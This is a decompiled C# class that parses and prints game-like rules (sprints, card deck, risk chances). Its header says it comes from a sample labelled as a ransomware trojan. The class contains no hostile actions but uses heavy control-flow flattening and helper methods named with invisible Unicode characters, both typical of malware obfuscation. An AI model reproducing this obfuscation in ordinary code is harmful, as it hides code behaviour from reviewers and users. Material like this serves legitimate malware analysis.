// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: AdjustmentRu, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 295D2DB0-E85F-4EE4-A4D8-BB22DC4EE57D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-56431be0898e907a3b97e42a4c9d74cbdb487ed8617dcf64fb3a8dddef6dded1.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
    }

    public static Rules Deserialize(JSONNode json)
    {
      int asInt = json["max-impact"].AsInt;
label_1:
      int num1 = 1213064213;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 697722176)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 1908935764 ^ -1886056710;
            continue;
          case 2:
            num1 = (int) num2 * -84228965 ^ 1972904253;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
label_1:
      int num1 = -509524560;
      bool flag;
      int aIndex;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1178353901)) % 9U)
        {
          case 0:
            ++aIndex;
            num1 = (int) num2 * 1744663702 ^ 1764320713;
            continue;
          case 1:
            num1 = (int) num2 * -1495109403 ^ -1326576035;
            continue;
          case 2:
            aIndex = 0;
            num1 = (int) num2 * -943418182 ^ -710831615;
            continue;
          case 3:
            flag = aIndex < numArray.Length;
            num1 = -1834226076;
            continue;
          case 4:
            goto label_1;
          case 5:
            riskChances = numArray;
            num1 = (int) num2 * 128760488 ^ -1595212966;
            continue;
          case 7:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = -1962339958;
            continue;
          case 8:
            int num3 = flag ? -220116204 : (num3 = -1984761029);
            num1 = num3 ^ (int) num2 * -426782137;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = -1815556526;
      int aIndex1;
      int count;
      bool flag1;
      int aIndex2;
      bool flag2;
      JSONNode jsonNode;
      int num2;
      List<Card> cardList;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -1233500109)) % 20U)
        {
          case 0:
            aIndex2 = 0;
            num1 = (int) num3 * -1195195362 ^ 1414674936;
            continue;
          case 1:
            count = json.Count;
            cardList = new List<Card>();
            num1 = (int) num3 * -485827928 ^ -61117131;
            continue;
          case 3:
            num1 = (int) num3 * 1339284178 ^ -253443232;
            continue;
          case 4:
            cardList.Add(new Card()
            {
              Impact = flag2 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = -1342418588;
            continue;
          case 5:
            ++aIndex1;
            num1 = (int) num3 * 651219073 ^ -1210174005;
            continue;
          case 6:
            aIndex1 = 0;
            num1 = (int) num3 * -20851219 ^ 2108900456;
            continue;
          case 7:
            int num4;
            num1 = num4 = aIndex2 >= maxImpact * 2 ? -1090363768 : (num4 = -872077044);
            continue;
          case 8:
            array = cardList.ToArray();
            num1 = (int) num3 * -850606081 ^ -1355023991;
            continue;
          case 9:
            num1 = (int) num3 * 372062906 ^ 1005851701;
            continue;
          case 10:
            flag2 = aIndex2 < maxImpact;
            num1 = -681713413;
            continue;
          case 11:
            ++num2;
            num1 = (int) num3 * -377576487 ^ 1244310880;
            continue;
          case 12:
            ++aIndex2;
            num1 = (int) num3 * -1533003131 ^ -1855765064;
            continue;
          case 13:
            flag1 = aIndex1 < count;
            num1 = -1280551194;
            continue;
          case 14:
            num1 = (int) num3 * -420374922 ^ 784646927;
            continue;
          case 15:
            jsonNode = json[aIndex1];
            num1 = -1945493101;
            continue;
          case 16:
            int num5;
            num1 = num5 = num2 < jsonNode[aIndex2].AsInt ? -986137543 : (num5 = -784178039);
            continue;
          case 17:
            int num6 = flag1 ? 1170129292 : (num6 = 828329775);
            num1 = num6 ^ (int) num3 * 584006148;
            continue;
          case 18:
            goto label_1;
          case 19:
            num2 = 0;
            num1 = -1064059702;
            continue;
          default:
            goto label_21;
        }
      }
label_21:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1938563366;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2024781593)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str = Rules.\u200C⁭⁬⁮‮⁪‌⁮‮⁭‭⁮‍⁭‭‏⁭‌‬‎⁮⁫‫⁮‏‎‬⁬⁬⁮‭‌​‌‪‬‫‏⁫⁫‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -360654931 ^ -351967436;
            continue;
          case 2:
            num1 = (int) num2 * 1986569882 ^ 541169948;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = 2123369926;
      string str1;
      string str2;
      Card[] cards;
      int index;
      Card card1;
      bool flag;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 563351372)) % 17U)
        {
          case 0:
            str2 = Rules.\u206A‬‪‍‫⁭‫‏‪‮‏⁯‎‮​‎‍‏⁬‮⁯‎⁭‍‪⁫‪⁪‎⁪‮‪‭‎‬‮⁯‏‍‭‮(str1, "\n]");
            num1 = (int) num3 * -780054916 ^ 1836300128;
            continue;
          case 1:
            str1 = "[\n\t";
            num1 = (int) num3 * 111589813 ^ -581389379;
            continue;
          case 2:
            card1 = cards[index];
            num1 = 1955883081;
            continue;
          case 3:
            str1 = Rules.\u206A‬‪‍‫⁭‫‏‪‮‏⁯‎‮​‎‍‏⁬‮⁯‎⁭‍‪⁫‪⁪‎⁪‮‪‭‎‬‮⁯‏‍‭‮(str1, "\n\t");
            num1 = (int) num3 * 357570192 ^ 1212192541;
            continue;
          case 4:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u202E‮⁭‎‬‮‎‭⁪‏‫‪‌⁯⁫​‍‪⁫⁬⁫‪‮⁪⁪⁫⁪⁭‪⁭⁬‬‭‏‪‬‌‪⁬‪‮((object) card2) : (string) null;
            str1 = Rules.\u206A⁭⁫‎‎⁪​‬⁮⁭⁪‫‫‪⁪⁬⁭⁬⁯​‫⁫⁮⁫‌‪‏‎⁬‌⁯⁯⁫​⁮⁪⁪‭⁯‎‮(str3, str4, " ");
            num1 = 1804890476;
            continue;
          case 5:
            int num4 = flag ? 1833075762 : (num4 = 893951351);
            num1 = num4 ^ (int) num3 * 1627764544;
            continue;
          case 6:
            flag = num2 != card1.Type;
            num1 = (int) num3 * -663521894 ^ -1649317420;
            continue;
          case 7:
            num1 = (int) num3 * -742007786 ^ -1994679611;
            continue;
          case 8:
            int num5;
            num1 = num5 = index >= cards.Length ? 1049364878 : (num5 = 1746743699);
            continue;
          case 9:
            num2 = 0;
            num1 = (int) num3 * -1735533697 ^ -1321343355;
            continue;
          case 10:
            num2 = card1.Type;
            num1 = (int) num3 * 1568153285 ^ -1441108421;
            continue;
          case 11:
            ++index;
            num1 = (int) num3 * -1517500372 ^ -2145359825;
            continue;
          case 12:
            num1 = (int) num3 * 607090154 ^ 382575927;
            continue;
          case 13:
            goto label_1;
          case 14:
            num1 = (int) num3 * 681767276 ^ 301983343;
            continue;
          case 15:
            cards = this.Cards;
            index = 0;
            num1 = (int) num3 * -587647255 ^ 739968647;
            continue;
          default:
            goto label_18;
        }
      }
label_18:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = 1728813756;
      string str1;
      int index;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 828199905)) % 9U)
        {
          case 0:
            str2 = Rules.\u206A‬‪‍‫⁭‫‏‪‮‏⁯‎‮​‎‍‏⁬‮⁯‎⁭‍‪⁫‪⁪‎⁪‮‪‭‎‬‮⁯‏‍‭‮(str1, " ]");
            num1 = (int) num2 * -881350900 ^ -2019130357;
            continue;
          case 1:
            str1 = Rules.\u206A‬‪‍‫⁭‫‏‪‮‏⁯‎‮​‎‍‏⁬‮⁯‎⁭‍‪⁫‪⁪‎⁪‮‪‭‎‬‮⁯‏‍‭‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u206D⁬​‫‬‍‬⁮⁮‬‎‮‌‪⁪‌‫‬‭‎‭‏‬⁪⁪​⁮‌‭‭‫‏⁬‎‪⁭‪⁬‮⁯‮()));
            index = 1;
            num1 = (int) num2 * -1214204319 ^ -62961534;
            continue;
          case 2:
            num1 = (int) num2 * -1921048627 ^ -1443606036;
            continue;
          case 3:
            num1 = (int) num2 * -247335160 ^ -1609126866;
            continue;
          case 4:
            flag = index < this.RiskChances.Length;
            num1 = 482190987;
            continue;
          case 5:
            goto label_1;
          case 7:
            str1 = Rules.\u206A⁭⁫‎‎⁪​‬⁮⁭⁪‫‫‪⁪⁬⁭⁬⁯​‫⁫⁮⁫‌‪‏‎⁬‌⁯⁯⁫​⁮⁪⁪‭⁯‎‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u206D⁬​‫‬‍‬⁮⁮‬‎‮‌‪⁪‌‫‬‭‎‭‏‬⁪⁪​⁮‌‭‭‫‏⁬‎‪⁭‪⁬‮⁯‮()));
            ++index;
            num1 = 513118430;
            continue;
          case 8:
            int num3 = flag ? -1208084072 : (num3 = -1486247444);
            num1 = num3 ^ (int) num2 * 693853601;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str2;
    }

    static string \u200C⁭⁬⁮‮⁪‌⁮‮⁭‭⁮‍⁭‭‏⁭‌‬‎⁮⁫‫⁮‏‎‬⁬⁬⁮‭‌​‌‪‬‫‏⁫⁫‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u206A‬‪‍‫⁭‫‏‪‮‏⁯‎‮​‎‍‏⁬‮⁯‎⁭‍‪⁫‪⁪‎⁪‮‪‭‎‬‮⁯‏‍‭‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u202E‮⁭‎‬‮‎‭⁪‏‫‪‌⁯⁫​‍‪⁫⁬⁫‪‮⁪⁪⁫⁪⁭‪⁭⁬‬‭‏‪‬‌‪⁬‪‮([In] object obj0) => obj0.ToString();

    static string \u206A⁭⁫‎‎⁪​‬⁮⁭⁪‫‫‪⁪⁬⁭⁬⁯​‫⁫⁮⁫‌‪‏‎⁬‌⁯⁯⁫​⁮⁪⁪‭⁯‎‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u206D⁬​‫‬‍‬⁮⁮‬‎‮‌‪⁪‌‫‬‭‎‭‏‬⁪⁪​⁮‌‭‭‫‏⁬‎‪⁭‪⁬‮⁯‮() => CultureInfo.InvariantCulture;
  }
}
